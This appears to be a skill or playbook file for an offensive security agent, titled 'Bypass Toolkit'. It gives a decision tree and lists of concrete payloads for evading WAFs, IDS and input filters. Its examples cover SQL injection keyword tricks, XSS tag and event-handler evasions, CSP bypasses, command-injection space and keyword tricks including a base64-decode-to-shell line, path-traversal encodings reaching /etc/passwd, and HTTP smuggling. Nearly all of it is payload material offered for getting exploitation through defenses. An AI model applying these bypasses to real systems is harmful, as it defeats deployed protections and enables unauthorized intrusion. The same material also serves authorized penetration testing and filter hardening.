# Bypass Toolkit

## Trigger
Load when payloads that should work are being blocked, filtered, or returning unexpected results. WAF, IDS, input filters, or sanitization is preventing exploitation.

## Attack Surface
Any input that reaches a WAF or filter before reaching the application. Signatures: 403 responses, empty results for valid queries, connection resets, captcha triggers.

## Decision Tree

```
Payload blocked
  |
  ├── 1. IDENTIFY: What's doing the blocking?
  |     ├── Response contains WAF brand? (Cloudflare, AWS WAF, ModSecurity)
  |     ├── Connection reset → likely IDS/IPS
  |     ├── 403/406 → application-level filter
  |     └── Silent fail → input sanitization
  |
  ├── 2. CLASSIFY: What's being filtered?
  |     ├── Specific keywords? (SELECT, UNION, /etc/passwd)
  |     ├── Special characters? (<, >, ', ", ;)
  |     ├── Pattern matching? (SQL syntax, JS code, shell commands)
  |     └── Length/encoding? (payload truncated, charset rejected)
  |
  ├── 3. BYPASS: Apply technique based on classification
  |     ├── Keyword filter → encoding, case variation, comments
  |     ├── Character filter → alternate encoding, double encoding
  |     ├── Pattern filter → fragmentation, parser differentials
  |     └── Length filter → compression, chunking
  |
  └── 4. RETEST: Verify bypass
```

## Techniques

### SQL Injection Bypasses

**Keyword filtering:**
- Case variation: `SeLeCt`, `select`
- Inline comments: `SEL/**/ECT`, `UN/**/ION`
- Double keyword: `SELSELECTECT` (inner stripped → SELECT remains)
- Backtick obfuscation: MySQL treats backticks as identifiers
- Hex encoding: `0x73656c656374` instead of `SELECT`

**Quote escaping:**
- Backslash escape: use `\` as input to escape the closing quote
- Hex literals: `0x61646d696e` instead of `'admin'`
- CHAR() function: `CHAR(97,100,109,105,110)`

**WAF detection bypass:**
- MySQL `innodb_table_stats` instead of `information_schema`
- `PROCEDURE ANALYSE()` injection
- `BETWEEN` operator tautology
- `REGEXP` byte-by-byte oracle

### XSS Bypasses

**Tag filtering:**
- Case: `<ScRiPt>`
- Incomplete tags: `<img src=x onerror=`
- Custom/unusual tags: `<svg>`, `<math>`, `<details>`
- HTML entity encoding in attribute context

**Event handler filtering:**
- Obfuscation: `onload`, `oNloAd`
- Lesser-known handlers: `onpointerenter`, `ontoggle`, `onfocusin`
- `javascript:` protocol with encoding

**CSP evasion:**
- JSONP endpoints on allowlisted domains
- AngularJS `{{constructor.constructor()}}` when CSP allows inline
- DOM clobbering via `id`/`name` attributes
- Script gadget chains in allowed libraries

### Command Injection Bypasses

**Space filtering:**
- `${IFS}`: `cat${IFS}/etc/hostname`
- Brace expansion: `{cat,/etc/hostname}`
- Tab: `cat%09/etc/hostname`
- Input redirection: `cat</etc/hostname`

**Keyword filtering:**
- Quote insertion: `c'a't /etc/hostname`
- Backslash: `c\a\t /etc/hostname`
- Wildcards: `/???/???????` → `/etc/hostname`
- Variable construction: `a=c;b=at;$a$b /etc/hostname`

**Encoding:**
- Base64: `echo <b64> | base64 -d | sh`
- Hex: `echo -e '\x63\x61\x74'`
- Octal: `$'\143\141\164'`

### Path Traversal Bypasses

**Path sanitization:**
- Double encoding: `%252e%252e%252f`
- Unicode: `..%c0%af`, `..%ef%bc%8f`
- Nested traversal: `....//....//`
- Null byte (legacy): `../../etc/passwd%00.jpg`
- Absolute path: `/etc/passwd` when filter only checks for `..`

### General WAF Evasion

**HTTP parameter pollution:**
- Send same parameter multiple times: `id=1&id=2 UNION SELECT...`
- Some parsers take first, some take last

**HTTP smuggling:**
- CL.TE or TE.CL desync to smuggle payloads past front-end WAF

**Content-Type switching:**
- Switch JSON to XML if XML parser has different filter rules
- Multipart form-data may bypass body inspection

**Charset tricks:**
- Shift-JIS: backslash (0x5c) can consume next byte
- UTF-7: legacy IE charset for XSS
- UTF-16: null bytes between characters

## Pitfalls
- Not identifying the specific WAF before trying random bypasses
- Applying bypasses without understanding what's being filtered
- One bypass working on staging but not production (different WAF config)
- Triggering IP blacklisting with too many failed attempts
